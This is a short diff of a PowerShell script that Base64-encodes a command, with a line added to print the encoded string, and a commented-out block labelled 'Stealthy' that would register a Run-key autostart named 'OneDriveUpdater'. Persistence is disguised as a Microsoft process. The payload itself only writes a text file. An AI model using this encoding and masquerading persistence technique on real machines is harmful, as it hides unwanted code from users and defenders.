@@ -3,6 +3,8 @@ $payload = 'Set-Content -Path "$env:TEMP\sysinfo.txt" -Value "Hello again Old Fr
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
 $encodedPayload = [Convert]::ToBase64String($bytes)
 
+Write-Host $encodedPayload
+
 # Persistence via Registry (Stealthy) 
 <# New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
 -Name "OneDriveUpdater" `
